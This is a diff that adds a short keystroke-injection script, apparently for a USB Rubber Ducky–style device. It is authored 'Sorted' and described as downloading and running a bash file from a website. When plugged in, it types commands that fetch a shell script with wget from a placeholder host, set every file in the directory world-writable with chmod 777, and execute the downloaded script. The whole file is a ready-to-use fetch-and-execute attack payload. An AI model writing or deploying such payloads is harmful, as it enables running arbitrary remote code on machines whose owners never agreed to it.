@@ -1,0 +1,10 @@
+REM Author: Sorted
+REM Description: This script download and runs a bash file from a website.
+
+STRING wget https://yourlink.poop/FIleNAME.sh
+ENTER
+DELAY 200
+STRING chmod 777 *
+ENTER
+STRING sh FIleNAME.sh
+ENTER
